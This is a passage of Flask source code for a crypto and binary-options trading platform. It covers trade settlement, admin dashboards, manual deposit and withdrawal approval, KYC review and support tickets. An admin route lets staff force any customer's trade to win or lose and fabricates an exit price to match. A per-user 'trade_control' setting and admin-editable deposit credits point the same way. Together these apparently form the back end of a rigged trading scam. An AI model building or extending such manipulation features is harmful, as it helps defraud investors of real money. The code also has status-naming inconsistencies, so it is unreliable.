                trade.profit_loss = profit
            else:
                trade.status = 'lose'
                trade.profit_loss = -Decimal(str(trade.amount))
        
        # Update user balance
        wallet = current_user.wallet
        profit_loss_decimal = Decimal(str(trade.profit_loss))
        
        if trade.is_demo:
            wallet.demo_balance = wallet.demo_balance + profit_loss_decimal
        else:
            wallet.balance = wallet.balance + profit_loss_decimal
        
        # Create transaction record
        transaction = Transaction()
        transaction.user_id = current_user.id
        transaction.transaction_type = 'trade_result'
        transaction.amount = trade.profit_loss
        transaction.description = f"Trade {trade.status}: {trade.asset} {trade.trade_type}"
        transaction.status = 'completed'
        
        db.session.add(transaction)
        db.session.commit()
        
        return jsonify({
            'success': True,
            'trade': {
                'id': trade.id,
                'status': trade.status,
                'profit_loss': float(trade.profit_loss),
                'asset': trade.asset,
                'trade_type': trade.trade_type,
                'amount': float(trade.amount)
            },
            'new_balance': float(wallet.demo_balance if trade.is_demo else wallet.balance)
        })
        
    except Exception as e:
        db.session.rollback()
        return jsonify({
            'success': False,
            'error': str(e)
        })

# ===============================
# ADMIN ROUTES AND FUNCTIONALITY
# ===============================

def admin_required(f):
    """Decorator to require admin privileges"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated or not current_user.is_admin:
            flash('Admin privileges required.', 'error')
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin')
@login_required
def admin_dashboard():
    """Advanced admin dashboard with comprehensive user reporting and analytics"""
    # Check admin privileges
    if not current_user.is_admin:
        flash('Admin privileges required.', 'error')
        return redirect(url_for('dashboard'))
        
    from datetime import datetime, timedelta
    
    # Core user statistics
    total_users = User.query.count()
    active_users = User.query.filter_by(is_active=True).count()
    inactive_users = User.query.filter_by(is_active=False).count()
    admin_users = User.query.filter_by(is_admin=True).count()
    
    # Time-based analytics
    now = datetime.utcnow()
    today = now.replace(hour=0, minute=0, second=0, microsecond=0)
    week_ago = now - timedelta(days=7)
    month_ago = now - timedelta(days=30)
    
    # Registration trends
    users_today = User.query.filter(User.created_at >= today).count()
    users_this_week = User.query.filter(User.created_at >= week_ago).count()
    users_this_month = User.query.filter(User.created_at >= month_ago).count()
    
    # Login activity analysis
    logged_in_today = User.query.filter(User.last_login >= today).count()
    logged_in_week = User.query.filter(User.last_login >= week_ago).count()
    never_logged_in = User.query.filter(User.last_login.is_(None)).count()
    
    # User engagement metrics
    total_trades = Trade.query.count()
    active_traders = User.query.join(Trade).distinct().count()
    demo_users = User.query.join(Wallet).filter(Wallet.demo_balance > 0).count()
    live_users = User.query.join(Wallet).filter(Wallet.balance > 0).count()
    
    # Recent registrations with details
    recent_registrations = User.query.order_by(User.created_at.desc()).limit(10).all()
    
    # User status breakdown
    user_status_data = {
        'active_regular': User.query.filter_by(is_active=True, is_admin=False).count(),
        'active_admin': User.query.filter_by(is_active=True, is_admin=True).count(),
        'inactive_total': inactive_users,
        'never_logged': never_logged_in
    }
    
    # Recent activity summary
    recent_activity = {
        'new_users_24h': users_today,
        'logins_24h': logged_in_today,
        'total_engagement': (logged_in_week / total_users * 100) if total_users > 0 else 0
    }
    
    # Admin user list with last activity
    admin_list = User.query.filter_by(is_admin=True, is_active=True).all()
    
    # User growth trend (last 30 days)
    daily_registrations = []
    for i in range(30):
        day_start = today - timedelta(days=i)
        day_end = day_start + timedelta(days=1)
        day_count = User.query.filter(
            User.created_at >= day_start,
            User.created_at < day_end
        ).count()
        daily_registrations.append({
            'date': day_start.strftime('%Y-%m-%d'),
            'count': day_count
        })
    
    return render_template('admin/dashboard.html', 
                         total_users=total_users,
                         active_users=active_users,
                         inactive_users=inactive_users,
                         admin_users=admin_users,
                         users_today=users_today,
                         users_this_week=users_this_week,
                         users_this_month=users_this_month,
                         logged_in_today=logged_in_today,
                         logged_in_week=logged_in_week,
                         never_logged_in=never_logged_in,
                         total_trades=total_trades,
                         active_traders=active_traders,
                         demo_users=demo_users,
                         live_users=live_users,
                         recent_registrations=recent_registrations,
                         user_status_data=user_status_data,
                         recent_activity=recent_activity,
                         admin_list=admin_list,
                         daily_registrations=daily_registrations)

@app.route('/admin/users')
@login_required
@admin_required
def admin_users():
    """Manage all users"""
    page = request.args.get('page', 1, type=int)
    users = User.query.paginate(
        page=page, per_page=20, error_out=False
    )
    
    # Get recent trades for each user
    user_trades = {}
    for user in users.items:
        recent_trades = Trade.query.filter(
            Trade.user_id == user.id,
            Trade.status.in_(['won', 'lost'])
        ).order_by(Trade.closed_at.desc()).limit(5).all()
        user_trades[user.id] = recent_trades
    
    return render_template('admin/users.html', users=users, user_trades=user_trades)

@app.route('/admin/user/<int:user_id>', methods=['GET', 'POST'])
@login_required
@admin_required
def admin_user_detail(user_id):
    """View and edit specific user with trade management"""
    user = User.query.get_or_404(user_id)
    form = AdminUserForm()
    
    if form.validate_on_submit():
        user.is_active = form.is_active.data
        user.is_admin = form.is_admin.data
        user.trade_control = form.trade_control.data
        
        db.session.commit()
        flash(f'User {user.username} updated successfully. Trade control set to: {form.trade_control.data}', 'success')
        return redirect(url_for('admin_user_detail', user_id=user_id))
    
    # Pre-populate form
    form.is_active.data = user.is_active
    form.is_admin.data = user.is_admin
    form.trade_control.data = user.trade_control or 'normal'
    
    # Get user's trades
    active_trades = Trade.query.filter_by(user_id=user.id, status='active').order_by(Trade.created_at.desc()).all()
    closed_trades = Trade.query.filter(
        Trade.user_id == user.id,
        Trade.status.in_(['won', 'lost'])
    ).order_by(Trade.closed_at.desc()).limit(20).all()
    
    return render_template('admin/user_detail.html', 
                         user=user, 
                         form=form, 
                         active_trades=active_trades,
                         closed_trades=closed_trades)

@app.route('/admin/trade/<int:trade_id>/manipulate', methods=['POST'])
@login_required
@admin_required
def admin_manipulate_trade(trade_id):
    """Admin can force trade outcome"""
    trade = Trade.query.get_or_404(trade_id)
    
    force_result = request.form.get('force_result')
    admin_notes = request.form.get('admin_notes', f"Admin manipulation by {current_user.username}")
    
    if force_result == 'win':
        # Force trade to win
        trade.status = 'won'
        trade.exit_price = trade.entry_price + 0.001 if trade.trade_type == 'call' else trade.entry_price - 0.001
        trade.profit_loss = trade.amount * (trade.payout_percentage / 100)
        trade.closed_at = datetime.utcnow()
        
        # Update user balance
        wallet = Wallet.query.filter_by(user_id=trade.user_id).first()
        if wallet:
            if trade.is_demo:
                wallet.demo_balance += trade.profit_loss
            else:
                wallet.balance += trade.profit_loss
                
        # Add transaction record
        transaction = Transaction(
            user_id=trade.user_id,
            transaction_type='trade_win',
            amount=trade.profit_loss,
            description=f"Forced WIN - {trade.asset} trade - Admin: {admin_notes}"
        )
        db.session.add(transaction)
        
        flash(f'Trade #{trade.id} forced to WIN successfully! User gained ${trade.profit_loss:.2f}', 'success')
        
    elif force_result == 'lose':
        # Force trade to lose
        trade.status = 'lost'
        trade.exit_price = trade.entry_price - 0.001 if trade.trade_type == 'call' else trade.entry_price + 0.001
        trade.profit_loss = -trade.amount
        trade.closed_at = datetime.utcnow()
        
        # Add transaction record
        transaction = Transaction(
            user_id=trade.user_id,
            transaction_type='trade_loss',
            amount=trade.amount,
            description=f"Forced LOSS - {trade.asset} trade - Admin: {admin_notes}"
        )
        db.session.add(transaction)
        
        flash(f'Trade #{trade.id} forced to LOSS successfully! User lost ${trade.amount:.2f}', 'warning')
    
    else:
        flash('Invalid trade manipulation option', 'error')
        return redirect(url_for('admin_user_detail', user_id=trade.user_id))
    
    db.session.commit()
    return redirect(url_for('admin_user_detail', user_id=trade.user_id))

@app.route('/admin/users/<int:user_id>/delete', methods=['POST'])
@login_required
@admin_required
def admin_delete_user(user_id):
    """Delete a user and all their associated data"""
    user_to_delete = User.query.get_or_404(user_id)
    
    # Prevent deletion of admin users (safety measure)
    if user_to_delete.is_admin:
        flash('Cannot delete admin users for security reasons', 'error')
        return redirect(url_for('admin_user_detail', user_id=user_id))
    
    # Prevent self-deletion
    if user_to_delete.id == current_user.id:
        flash('You cannot delete your own account', 'error')
        return redirect(url_for('admin_user_detail', user_id=user_id))
    
    try:
        username = user_to_delete.username
        
        # Delete user's trades (cascade should handle this, but being explicit)
        Trade.query.filter_by(user_id=user_id).delete()
        
        # Delete user's transactions
        Transaction.query.filter_by(user_id=user_id).delete()
        
        # Delete user's staking positions
        StakingPosition.query.filter_by(user_id=user_id).delete()
        
        # Delete user's deposit requests
        DepositRequest.query.filter_by(user_id=user_id).delete()
        
        # Delete user's wallet
        Wallet.query.filter_by(user_id=user_id).delete()
        
        # Finally delete the user
        db.session.delete(user_to_delete)
        db.session.commit()
        
        flash(f'User "{username}" and all associated data has been permanently deleted', 'success')
        return redirect(url_for('admin_users'))
        
    except Exception as e:
        db.session.rollback()
        flash(f'Error deleting user: {str(e)}', 'error')
        return redirect(url_for('admin_user_detail', user_id=user_id))

@app.route('/admin/deposits')
@login_required
@admin_required
def admin_deposits():
    deposits = DepositRequest.query.order_by(DepositRequest.created_at.desc()).all()
    return render_template('admin/deposits.html', deposits=deposits)

@app.route('/admin/withdrawals')
@login_required
@admin_required
def admin_withdrawals():
    withdrawals = WithdrawalRequest.query.order_by(WithdrawalRequest.created_at.desc()).all()
    return render_template('admin/withdrawals.html', withdrawals=withdrawals)

@app.route('/admin/process_withdrawal/<int:withdrawal_id>', methods=['POST'])
@login_required
@admin_required
def admin_process_withdrawal(withdrawal_id):
    withdrawal = WithdrawalRequest.query.get_or_404(withdrawal_id)
    
    if withdrawal.status != 'pending':
        flash('This withdrawal request has already been processed.', 'warning')
        return redirect(url_for('admin_withdrawals'))
    
    status = request.form.get('status')
    admin_notes = request.form.get('admin_notes', '')
    
    if status == 'approved':
        # Deduct amount from user's balance
        user_wallet = withdrawal.user.wallet
        if user_wallet.balance >= withdrawal.amount:
            user_wallet.balance -= withdrawal.amount
            user_wallet.total_withdrawn += withdrawal.amount
            
            # Create transaction record
            transaction = Transaction(
                user_id=withdrawal.user_id,
                transaction_type='withdrawal',
                amount=-withdrawal.amount,
                description=f'Withdrawal {withdrawal.amount} {withdrawal.currency} to {withdrawal.wallet_address[:10]}... - Approved by admin'
            )
            db.session.add(transaction)
            
            withdrawal.status = 'approved'
            flash(f'Withdrawal of ${withdrawal.amount:.2f} approved and processed successfully.', 'success')
            
            # Create success notification for user
            user_transaction = Transaction(
                user_id=withdrawal.user_id,
                transaction_type='notification',
                amount=0,
                description=f'✅ Your withdrawal request of ${withdrawal.amount:.2f} {withdrawal.currency} has been APPROVED and processed!'
            )
            db.session.add(user_transaction)
        else:
            flash(f'Cannot approve withdrawal - user has insufficient balance (${user_wallet.balance:.2f} available).', 'error')
            return redirect(url_for('admin_withdrawals'))
    
    elif status == 'rejected':
        withdrawal.status = 'rejected'
        flash(f'Withdrawal request of ${withdrawal.amount:.2f} has been rejected.', 'warning')
        
        # Create rejection notification for user
        user_notification = Transaction(
            user_id=withdrawal.user_id,
            transaction_type='notification',
            amount=0,
            description=f'❌ Your withdrawal request of ${withdrawal.amount:.2f} {withdrawal.currency} has been REJECTED. Reason: {admin_notes or "Not specified"}'
        )
        db.session.add(user_notification)
    
    withdrawal.admin_notes = admin_notes
    withdrawal.processed_at = datetime.utcnow()
    withdrawal.processed_by = current_user.id
    
    db.session.commit()
    return redirect(url_for('admin_withdrawals'))

@app.route('/admin/process_deposit/<int:deposit_id>', methods=['GET', 'POST'])
@login_required
@admin_required
def admin_process_deposit(deposit_id):
    deposit = DepositRequest.query.get_or_404(deposit_id)
    form = AdminDepositForm()
    
    if form.validate_on_submit():
        deposit.status = form.status.data
        deposit.admin_notes = form.admin_notes.data
        deposit.processed_at = datetime.utcnow()
        deposit.processed_by = current_user.id
        
        if form.status.data == 'approved':
            # Add balance to user's account
            balance_to_add = form.balance_amount.data or deposit.amount
            user = deposit.user
            user.wallet.balance += balance_to_add
            user.wallet.total_invested += balance_to_add
            
            # Create transaction record
            transaction = Transaction(
                user_id=user.id,
                transaction_type='deposit',
                amount=balance_to_add,
                description=f'Crypto deposit approved: {deposit.currency} ${balance_to_add}'
            )
            db.session.add(transaction)
            
        db.session.commit()
        
        status_msg = 'approved' if form.status.data == 'approved' else 'rejected'
        flash(f'Deposit request {status_msg} successfully', 'success')
        return redirect(url_for('admin_deposits'))
    
    return render_template('admin/process_deposit.html', deposit=deposit, form=form)

@app.route('/admin/settings', methods=['GET', 'POST'])
@login_required
@admin_required
def admin_settings():
    form = AdminSettingsForm()
    
    if form.validate_on_submit():
        # Update or create settings
        settings = [
            ('usdt_address', form.usdt_address.data),
            ('btc_address', form.btc_address.data),
            ('eth_address', form.eth_address.data)
        ]
        
        for key, value in settings:
            setting = AdminSettings.query.filter_by(setting_key=key).first()
            if setting:
                setting.setting_value = value
                setting.updated_by = current_user.id
                setting.updated_at = datetime.utcnow()
            else:
                setting = AdminSettings(
                    setting_key=key,
                    setting_value=value,
                    description=f'{key.replace("_", " ").title()} for deposits',
                    updated_by=current_user.id
                )
                db.session.add(setting)
        
        # Handle QR code image uploads
        qr_files = [
            ('usdt_qr', form.usdt_qr_code.data),
            ('btc_qr', form.btc_qr_code.data),
            ('eth_qr', form.eth_qr_code.data)
        ]
        
        for key, file in qr_files:
            if file and file.filename != '':
                # Save the uploaded file
                filename = secure_filename(f"{key}_{int(time.time())}.{file.filename.split('.')[-1]}")
                file_path = os.path.join('static', 'qr_codes', filename)
                file.save(file_path)
                
                # Update the database with the file path
                setting = AdminSettings.query.filter_by(setting_key=f'{key}_code').first()
                if setting:
                    # Remove old file if it exists
                    if setting.setting_value and os.path.exists(setting.setting_value):
                        os.remove(setting.setting_value)
                    setting.setting_value = file_path
                    setting.updated_by = current_user.id
                    setting.updated_at = datetime.utcnow()
                else:
                    setting = AdminSettings(
                        setting_key=f'{key}_code',
                        setting_value=file_path,
                        description=f'{key.replace("_", " ").title()} QR code image',
                        updated_by=current_user.id
                    )
                    db.session.add(setting)
        
        db.session.commit()
        flash('Cryptocurrency addresses and QR codes updated successfully', 'success')
        return redirect(url_for('admin_settings'))
    
    # Load current settings
    usdt_setting = AdminSettings.query.filter_by(setting_key='usdt_address').first()
    btc_setting = AdminSettings.query.filter_by(setting_key='btc_address').first()
    eth_setting = AdminSettings.query.filter_by(setting_key='eth_address').first()
    
    # Load QR code settings
    usdt_qr_setting = AdminSettings.query.filter_by(setting_key='usdt_qr_code').first()
    btc_qr_setting = AdminSettings.query.filter_by(setting_key='btc_qr_code').first()
    eth_qr_setting = AdminSettings.query.filter_by(setting_key='eth_qr_code').first()
    
    if usdt_setting:
        form.usdt_address.data = usdt_setting.setting_value
    if btc_setting:
        form.btc_address.data = btc_setting.setting_value
    if eth_setting:
        form.eth_address.data = eth_setting.setting_value
    
    return render_template('admin/settings.html', 
                         form=form,
                         usdt_qr=usdt_qr_setting.setting_value if usdt_qr_setting else None,
                         btc_qr=btc_qr_setting.setting_value if btc_qr_setting else None,
                         eth_qr=eth_qr_setting.setting_value if eth_qr_setting else None)

@app.route('/admin/kyc')
@login_required
@admin_required
def admin_kyc():
    """Admin KYC management page"""
    page = request.args.get('page', 1, type=int)
    per_page = 10
    
    kyc_requests = KYCRequest.query.order_by(KYCRequest.created_at.desc()).paginate(
        page=page, per_page=per_page, error_out=False
    )
    
    # Get counts for dashboard
    pending_count = KYCRequest.query.filter_by(status='pending').count()
    approved_count = KYCRequest.query.filter_by(status='approved').count()
    rejected_count = KYCRequest.query.filter_by(status='rejected').count()
    
    return render_template('admin/kyc.html', 
                         kyc_requests=kyc_requests,
                         pending_count=pending_count,
                         approved_count=approved_count,
                         rejected_count=rejected_count)

@app.route('/admin/kyc/<int:kyc_id>', methods=['GET', 'POST'])
@login_required
@admin_required
def admin_process_kyc(kyc_id):
    """Process individual KYC request"""
    kyc_request = KYCRequest.query.get_or_404(kyc_id)
    form = AdminKYCForm()
    
    if form.validate_on_submit():
        kyc_request.status = form.status.data
        kyc_request.admin_notes = form.admin_notes.data
        kyc_request.processed_at = datetime.utcnow()
        kyc_request.processed_by = current_user.id
        
        # Update user KYC verification status
        if form.status.data == 'approved':
            kyc_request.user.kyc_verified = True
            flash(f'KYC request approved for {kyc_request.user.username}. User can now access live trading.', 'success')
        else:
            kyc_request.user.kyc_verified = False
            flash(f'KYC request rejected for {kyc_request.user.username}.', 'info')
        
        db.session.commit()
        return redirect(url_for('admin_kyc'))
    
    return render_template('admin/process_kyc.html', kyc_request=kyc_request, form=form)

# Support System Routes
@app.route('/support')
@login_required
def support():
    """Customer support ticket system"""
    user_tickets = SupportTicket.query.filter_by(user_id=current_user.id).order_by(SupportTicket.updated_at.desc()).all()
    return render_template('support/support.html', tickets=user_tickets)

@app.route('/support/new', methods=['GET', 'POST'])
@login_required
def create_support_ticket():
    """Create new support ticket"""
    form = SupportTicketForm()
    
    if form.validate_on_submit():
        # Create ticket
        ticket = SupportTicket()
        ticket.user_id = current_user.id
        ticket.subject = form.subject.data
        ticket.priority = form.priority.data
        db.session.add(ticket)
        db.session.flush()  # Get ticket ID
        
        # Create first message
        message = SupportMessage()
        message.ticket_id = ticket.id
        message.user_id = current_user.id
        message.message = form.message.data
        message.is_from_user = True
        db.session.add(message)
        
        db.session.commit()
        flash('Support ticket created successfully. Our team will respond soon!', 'success')
        return redirect(url_for('support_ticket', ticket_id=ticket.id))
    
    return render_template('support/create_ticket.html', form=form)

@app.route('/support/ticket/<int:ticket_id>')
@login_required
def support_ticket(ticket_id):
    """View specific support ticket"""
    ticket = SupportTicket.query.filter_by(id=ticket_id, user_id=current_user.id).first()
    if not ticket:
        flash('Ticket not found.', 'error')
        return redirect(url_for('support'))
    
    # Mark all admin messages as read
    SupportMessage.query.filter_by(ticket_id=ticket_id, is_from_user=False, read_by_user=False).update({'read_by_user': True})
    db.session.commit()
    
    messages = ticket.messages.order_by(SupportMessage.created_at.asc()).all()
    form = SupportMessageForm()
    
    return render_template('support/ticket.html', ticket=ticket, messages=messages, form=form)

@app.route('/support/ticket/<int:ticket_id>/message', methods=['POST'])
@login_required
def send_support_message(ticket_id):
    """Send message to support ticket"""
    ticket = SupportTicket.query.filter_by(id=ticket_id, user_id=current_user.id).first()
    if not ticket:
        flash('Ticket not found.', 'error')
        return redirect(url_for('support'))
    
    form = SupportMessageForm()
    if form.validate_on_submit():
        message = SupportMessage()
        message.ticket_id = ticket_id
        message.user_id = current_user.id
        message.message = form.message.data
        message.is_from_user = True
        db.session.add(message)
        
        # Update ticket status
        ticket.status = 'open'
        ticket.updated_at = datetime.utcnow()
        
        db.session.commit()
        flash('Message sent successfully!', 'success')
    
    return redirect(url_for('support_ticket', ticket_id=ticket_id))

# Admin Support Routes
@app.route('/admin/support')
@login_required
@admin_required
def admin_support():
    """Admin support dashboard"""
    page = request.args.get('page', 1, type=int)
    per_page = 10
    status = request.args.get('status', 'all')
    
    query = SupportTicket.query
    if status != 'all':
        query = query.filter_by(status=status)
    
    tickets = query.order_by(SupportTicket.updated_at.desc()).paginate(
        page=page, per_page=per_page, error_out=False
    )
    
    # Get counts
    open_count = SupportTicket.query.filter_by(status='open').count()
    in_progress_count = SupportTicket.query.filter_by(status='in_progress').count()
    closed_count = SupportTicket.query.filter_by(status='closed').count()
    
    return render_template('admin/support.html', 
                         tickets=tickets,
                         open_count=open_count,
                         in_progress_count=in_progress_count,
                         closed_count=closed_count,
                         current_status=status)

@app.route('/admin/support/ticket/<int:ticket_id>')
@login_required
@admin_required
def admin_support_ticket(ticket_id):
    """Admin view of support ticket"""
    ticket = SupportTicket.query.get_or_404(ticket_id)
    
    # Mark all user messages as read by admin
    SupportMessage.query.filter_by(ticket_id=ticket_id, is_from_user=True, read_by_admin=False).update({'read_by_admin': True})
    db.session.commit()
    
    messages = ticket.messages.order_by(SupportMessage.created_at.asc()).all()
    form = AdminSupportReplyForm()
    form.status.data = ticket.status
    
    return render_template('admin/support_ticket.html', ticket=ticket, messages=messages, form=form)

@app.route('/admin/support/ticket/<int:ticket_id>/reply', methods=['POST'])
@login_required
@admin_required
def admin_support_reply(ticket_id):
    """Admin reply to support ticket"""
    ticket = SupportTicket.query.get_or_404(ticket_id)
    form = AdminSupportReplyForm()
    
    if form.validate_on_submit():
        # Create reply message
        message = SupportMessage()
        message.ticket_id = ticket_id
        message.user_id = current_user.id
        message.message = form.message.data
        message.is_from_user = False
        db.session.add(message)
        
        # Update ticket status
        ticket.status = form.status.data
        ticket.updated_at = datetime.utcnow()
        
        db.session.commit()
        flash('Reply sent successfully!', 'success')
    
    return redirect(url_for('admin_support_ticket', ticket_id=ticket_id))

# Simple Chat Message Route for Dashboard Widget
@app.route('/send_chat_message', methods=['POST'])
@login_required
def send_chat_message():
    """Handle simple chat messages from dashboard widget"""
    data = request.get_json()
    message = data.get('message', '').strip()
    
    if not message:
        return jsonify({'success': False, 'error': 'Message cannot be empty'})
    
    try:
        # Create or get existing support ticket for this user
        ticket = SupportTicket.query.filter_by(user_id=current_user.id, status='open').first()
        
        if not ticket:
            # Create new ticket
            ticket = SupportTicket()
            ticket.user_id = current_user.id
            ticket.subject = 'Chat Support'
            ticket.priority = 'normal'
            ticket.status = 'open'
            db.session.add(ticket)
            db.session.flush()
        
        # Add message
        support_message = SupportMessage()
        support_message.ticket_id = ticket.id
        support_message.user_id = current_user.id
        support_message.message = message
        support_message.is_from_user = True
        db.session.add(support_message)
        
        ticket.updated_at = datetime.utcnow()
        db.session.commit()
        
        return jsonify({'success': True, 'message': 'Message sent successfully'})
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': 'Failed to send message'})

# Admin User Approval Routes
@app.route('/admin/user-approvals')
@login_required
@admin_required
def admin_user_approvals():
    """Admin interface for approving user registrations"""
    page = request.args.get('page', 1, type=int)
    per_page = 20
    status = request.args.get('status', 'pending')
    
    # Filter users based on status
    if status == 'pending':
        users = User.query.filter_by(is_approved=False, is_admin=False)
    elif status == 'approved':
        users = User.query.filter_by(is_approved=True, is_admin=False)
    else:  # all
        users = User.query.filter_by(is_admin=False)
    
    users = users.order_by(User.created_at.desc()).paginate(
        page=page, per_page=per_page, error_out=False
    )
    
    # Get counts
    pending_count = User.query.filter_by(is_approved=False, is_admin=False).count()
    approved_count = User.query.filter_by(is_approved=True, is_admin=False).count()
    total_count = User.query.filter_by(is_admin=False).count()
    
    return render_template('admin/user_approvals.html',
                         users=users,
                         pending_count=pending_count,
                         approved_count=approved_count,
                         total_count=total_count,
                         current_status=status)

@app.route('/admin/user-approvals/<int:user_id>/approve', methods=['POST'])
@login_required
@admin_required
def approve_user(user_id):
    """Approve a user registration"""
    user = User.query.get_or_404(user_id)
    
    if user.is_admin:
        flash('Cannot modify admin users.', 'error')
        return redirect(url_for('admin_user_approvals'))
    
    user.is_approved = True
    db.session.commit()
    
    flash(f'User {user.username} has been approved successfully.', 'success')
    return redirect(url_for('admin_user_approvals'))

@app.route('/admin/user-approvals/<int:user_id>/reject', methods=['POST'])
@login_required
@admin_required
def reject_user(user_id):
    """Reject a user registration (deactivate account)"""
    user = User.query.get_or_404(user_id)
    
    if user.is_admin:
        flash('Cannot modify admin users.', 'error')
        return redirect(url_for('admin_user_approvals'))
    
    user.is_active = False
    user.is_approved = False
    db.session.commit()
    
    flash(f'User {user.username} has been rejected and deactivated.', 'warning')
    return redirect(url_for('admin_user_approvals'))
